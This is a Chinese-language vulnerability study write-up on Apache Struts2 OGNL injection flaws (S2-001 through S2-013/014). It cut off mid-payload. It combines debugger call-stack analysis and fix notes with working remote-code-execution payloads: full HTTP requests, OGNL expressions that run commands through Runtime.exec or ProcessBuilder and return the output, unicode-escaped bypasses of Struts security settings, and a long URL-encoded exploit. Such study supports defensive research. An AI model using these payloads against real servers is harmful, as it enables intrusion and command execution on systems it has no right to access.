 2.0.0 - 2.3.15
S2-032
S2-032
⾼危
 2.0.0 - 2.3.15.1
S2-045/46
S2-045/46
⾼危
 2.3.5-2.3.31
S2-052
S2-052
⾼危
 2.0.0 - 2.3.15.1
S2-057
S2-057
⾼危
2.0.4 - 2.3.34, 
2.5.0 - 2.5.16
S2-061
S2-061
⾼危
2.0.0 - 2.5.25
2.0 前置知识 OGNL表达式
参考链接：https://mp.weixin.qq.com/s/8YxQPDu6sx-w_O4BrBCEmw
以及结合 Google OGNL语法
2.1. S2-001
漏洞复现
POST /s2_01_war_exploded/login.action HTTP/1.1
1
Host: localhost:8082
2
命令执⾏POC：
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) 
Gecko/20100101 Firefox/83.0
3
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
4
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-
US;q=0.3,en;q=0.2
5
Accept-Encoding: gzip, deflate
6
Content-Type: application/x-www-form-urlencoded
7
Content-Length: 34
8
Origin: http://localhost:8082
9
Connection: close
10
Upgrade-Insecure-Requests: 1
11
12
username=bbb&password=%25{233*233}
13
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]
{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new 
java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new 
char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatche
r.HttpServletResponse"),#f.getWriter().println(new 
java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} 
1
漏洞分析
跟着陈师傅⽂章⾛，⾸先将断点下
在/com/opensymphony/xwork2/interceptor/ParametersInterceptor.class:69 这⾥接收到
了我们传递的参数
然后来到了com.opensymphony.xwork2.DefaultActionInvocation#executeResult，进⼊这个
⽅法跟进this.result.execute() ⽅法
跟到这⾥有点懵逼了，我这边直接把断点下到jsp⾥ index.jsp:22 
 从这⾥仔细往下跟
⾸先会来到org.apache.struts2.views.jsp.ComponentTagSupport#doEndTag，然后进⼊
org.apache.struts2.components.UIBean#end，接下来我们跟进
org.apache.struts2.components.UIBean#evaluateParams
跟进去ﬁndString⽅法，调⽤了this.ﬁndValue，跟进去注意s2-001中altSyntax默认开启
构造表达式的关键⽅法TextParseUtil.translateVariables，expression为%{password}，经过
while循环，确定start和end定位后，此时var为password，stack.ﬁndValue(var, asType)后，
o被赋值为%{233*233}
然后递归解析表达式
此时部分调⽤栈
漏洞修复
官⽅给出的修复⽅案是将altSyntax默认关闭，使⽤break打断递归查询。
那么这⾥主要说⼀下altSyntax，这个功能是将标签内的内容当作OGNL表达式解析，关闭了之
后标签内的内容就不会当作OGNL表达式解析了。
2.2 S2-003 / 005
漏洞复现
003 POC：
这⾥有个坑 2.0.9 版本复现失败，使⽤的2.0.9.11版本
translateVariables:124, TextParseUtil (com.opensymphony.xwork2.util)
1
translateVariables:72, TextParseUtil (com.opensymphony.xwork2.util)
2
findValue:303, Component (org.apache.struts2.components)
3
evaluateParams:680, UIBean (org.apache.struts2.components)
4
end:450, UIBean (org.apache.struts2.components)
5
doEndTag:36, ComponentTagSupport (org.apache.struts2.views.jsp)
6
_jspx_meth_s_005ftextfield_005f1:22, index_jsp (org.apache.jsp)
7
_jspx_meth_s_005fform_005f0:22, index_jsp (org.apache.jsp)
8
_jspService:19, index_jsp (org.apache.jsp)
9
005 POC:
003 漏洞分析
看这个poc的样⼦，为什么前⾯要⽤u0023呢，Java⽀持这样么？⾸先在Java卷1中提到，
java是⽀持这种编码⽅的式 ？？？？？好像也不太对.......
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')
(bla)(bla)&
('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)
(bla)
1
('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)
(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023
foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)
(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1 
1
然后再来看，Struct对#是有防护的
此时的调⽤栈
所以需要编码⽅式绕过。
分析完poc编码问题，再来看下poc两部分都做了什么
 ⾸先在com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters 获
取我们传⼊的参数
然后在D:/java/Struts2/s2_03/web/WEB-INF/lib/xwork-
2.0.5.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.class:132中循
环取出参数进⾏处理
isAccepted:287, ParametersInterceptor 
(com.opensymphony.xwork2.interceptor)
1
acceptableName:272, ParametersInterceptor 
(com.opensymphony.xwork2.interceptor)
2
setParameters:205, ParametersInterceptor 
(com.opensymphony.xwork2.interceptor)
3
这⾥提⼀点，对参数的正则过滤是在this.acceptableName(name)中处理的。
回到this.setParameters(action, stack, parameters);在这之前(处理传⼊参数)，先做了另⼀
些操作，直接看OgnlContextState.setDenyMethodExecution(contextMap, true);
这⾥限定了，我们不能调⽤⽅法，所以poc中需要将这个参数改为false
然后再执⾏命令
⾄于poc的构造涉及了ognl语法，我传进去了这些代码，它居然会⽼⽼实实执⾏，可能这就是
表达式功能太强⼤了吧~
005 绕过
官⽅对于003是怎么修复的呢？ 官⽅通过增加安全配置禁⽌静态⽅法调⽤
（allowStaticMethodAcces）和类⽅法执⾏（MethodAccessor.den
yMethodExecution）等来修补。
更改poc为：
你增加多少个安全配置，我都能修改233333.....
2.3 S2-009
漏洞复现
POC:
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')
(bla)(bla)
1
('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)
(bla) 
1
('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)
(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023
foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)
(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1 
1
漏洞分析
S2-009 实际上应该是 S2-003/S2-005 的绕过。005的修复正则：
在修补了S2-003和S2-005之后，攻击者⼜发现了⼀种新的绕过ParametersInterceptor正则
保护的攻击⽅式
当传⼊(ONGL)(1)时，会将前者视为ONGL表达式来执⾏，从⽽绕过了正则的匹配保护。⽽且
由于其在HTTP参数值中，也可以进⼀步绕过字符串限制的保护。
POST /s2_01_war_exploded/user.action?
name=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3D+new+java
.lang.Boolean%28false%29,%20%23_memberAccess["allowStaticMethodAccess"]%3d
+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.ex
ec%28%27calc%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true HTTP/1.1
1
Host: localhost:8082
2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) 
Gecko/20100101 Firefox/83.0
3
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
4
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-
US;q=0.3,en;q=0.2
5
Accept-Encoding: gzip, deflate
6
Content-Type: application/x-www-form-urlencoded
7
Content-Length: 7
8
Origin: http://localhost:8082
9
Connection: close
10
Referer: http://localhost:8082/s2_01_war_exploded/index.jsp?name=aaa
11
Cookie: JSESSIONID=87F73BE03B999E74A9E11E562466AA01; 
UM_distinctid=175f2e14ced80d-00391c626d990b-4c3f2779-190140-
175f2e14cee91a; CNZZDATA1279152423=1639523356-1606094476-%7C1606094476; 
_jspxcms=e7fd1bb11f1a420d9a3f644e6f1682c3
12
Upgrade-Insecure-Requests: 1
13
private String acceptedParamNames = "[a-zA-Z0-9\\.\\]\\[\\(\\)_']+";
1
2.4 S2-012
漏洞复现
S2-001 POC
原理分析
这个漏洞的成因其实和前⾯的003、005、009⼤致路径⼀致，其区别点就在于⼊⼝点。这个
漏洞的关键点在于当⽤户传⼊的参数作为了重定向的参数时，其内容会被⼆次解析，并被解释
为Ognl表达式。
这⾥可以直接⽤S2-001中的payload，本身框架没有任何的限制,没有了003 005 009 的正则
限制。
重定向配置如下:
name=(#context["xwork.MethodAccessor.denyMethodExecution"]= new 
java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]= new 
java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('calc'))
(meh)&z[(name)('meh')]=true
1
1
2
/index.jsp?name=${name}
3
/index.jsp
4
/index.jsp
5
6
这⾥ UserAction 中定义有⼀个 name 变量，当触发 redirect 类型返回时，Struts2 获取使⽤ 
${name} 获取其值，在这个过程中会对 name 参数的值执⾏ OGNL 表达式解析，所谓的⼆次
解析为获取⽤户传⼊的name值为第⼀次解析，OGNL为第⼆次解析。
从⽽可以插⼊任意 OGNL 表达式导致命令执⾏。
2.5 S2-013 / 014
漏洞复现
POC:
7
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@ge
tRuntime().exec('calc').getInputStream(),#b=new 
java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new 
char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getR
esponse().getWriter(),#out.println(#d),#out.close())}
1
GET /s2_01_war_exploded/link.action?
sdgssd=%24%7b%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%5b%22%61%6c%6c%
6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%22%5d%3d%74%72
%75%65%2c%23%61%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%4
0%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%61%6c%63%27%
29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%62%3d%6e%65%77
%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%6
5%72%28%23%61%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%
66%65%72%65%64%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%63%68
%61%72%5b%35%30%30%30%30%5d%2c%23%63%2e%72%65%61%64%28%23%64%29%2c%23%6f%7
5%74%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%
72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73